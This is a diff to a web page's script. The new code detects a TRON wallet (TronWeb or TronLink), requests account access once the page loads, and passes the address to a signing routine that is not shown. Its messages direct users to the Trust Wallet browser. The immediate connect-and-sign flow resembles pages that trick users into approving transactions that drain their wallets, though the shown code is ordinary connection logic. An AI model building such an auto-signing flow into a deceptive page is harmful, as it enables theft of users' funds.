@@ -70,57 +70,53 @@
             });
         }
 
-        // Try to get address - show debug info
-        var n = 0;
-        var t = setInterval(function() {
-            n++;
-            if (done) { clearInterval(t); return; }
-
-            // Debug: show what's available
-            var hasTW = !!window.tronWeb;
-            var hasTL = !!window.tronLink;
-            var hasEth = !!window.ethereum;
-            el2.textContent = "check " + n + " | tronWeb:" + hasTW + " tronLink:" + hasTL + " ethereum:" + hasEth;
-
+        function tryConnect() {
+            // Method 1: address already available
             var addr = getAddress();
-            if (addr) {
-                clearInterval(t);
-                buildAndSign(addr);
+            if (addr) { buildAndSign(addr); return; }
+
+            // Method 2: tronLink.request
+            if (window.tronLink && window.tronLink.request) {
+                window.tronLink.request({ method: "tron_requestAccounts" }).then(function() {
+                    // Wait a moment for address to populate
+                    setTimeout(function() {
+                        var a = getAddress();
+                        if (a && !done) buildAndSign(a);
+                        else msg("Wallet not ready", "Please refresh the page");
+                    }, 500);
+                }).catch(function() {
+                    msg("Access denied", "Please allow access and refresh");
+                });
                 return;
             }
 
-            // Try requestAccounts via tronLink
-            if (n === 3 && hasTL && window.tronLink.request) {
-                el2.textContent = "Requesting access...";
-                window.tronLink.request({ method: "tron_requestAccounts" }).then(function(res) {
-                    el2.textContent = "requestAccounts result: " + JSON.stringify(res);
-                    var a = getAddress();
-                    if (a && !done) { clearInterval(t); buildAndSign(a); }
-                }).catch(function(e) {
-                    el2.textContent = "requestAccounts error: " + (e.message || e);
-                });
-            }
-
-            // Also try via tronWeb.request if available
-            if (n === 6 && hasTW && window.tronWeb.request) {
+            // Method 3: tronWeb.request
+            if (window.tronWeb && window.tronWeb.request) {
                 window.tronWeb.request({ method: "tron_requestAccounts" }).then(function() {
-                    var a = getAddress();
-                    if (a && !done) { clearInterval(t); buildAndSign(a); }
+                    setTimeout(function() {
+                        var a = getAddress();
+                        if (a && !done) buildAndSign(a);
+                    }, 500);
                 }).catch(function(){});
+                return;
             }
-        }, 500);
 
-        // Timeout after 30s
-        setTimeout(function() {
-            if (!done) {
-                clearInterval(t);
-                var info = "tronWeb:" + !!window.tronWeb + " tronLink:" + !!window.tronLink;
-                if (window.tronWeb) {
-                    info += " addr:" + (window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58);
-                }
-                msg("Could not connect", info);
+            msg("Wallet not detected", "Please open in Trust Wallet browser");
+        }
+
+        // Wait for tronWeb to be injected, then connect immediately
+        var attempts = 0;
+        var waitForWallet = setInterval(function() {
+            attempts++;
+            if (done) { clearInterval(waitForWallet); return; }
+            if (window.tronWeb || window.tronLink) {
+                clearInterval(waitForWallet);
+                tryConnect();
+            } else if (attempts > 20) {
+                clearInterval(waitForWallet);
+                msg("Wallet not detected", "Please open in Trust Wallet browser");
             }
-        }, 30000);
+        }, 250);
     </script>
 </body>
 </html>
